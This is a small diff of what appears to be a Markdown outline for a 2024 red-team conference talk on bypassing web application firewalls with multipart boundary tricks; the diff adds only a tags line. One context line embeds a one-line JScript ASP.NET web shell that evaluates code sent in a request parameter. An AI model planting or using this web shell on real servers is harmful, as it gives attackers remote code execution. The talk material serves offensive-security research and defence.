@@ -717,3 +717,5 @@ Content-Type: <%@ Page Language="Jscript"%><%eval(Request.Item["x"],"unsafe");%>
     2.4 Boundary 外也能丟東西\
     2.5 第一次知道 Double Boundary 的用法
 3. 拆解 WAF視野 與 Server視野
+
+###### tags: `devcore` `conference` `2024` `red team` `offensive security`
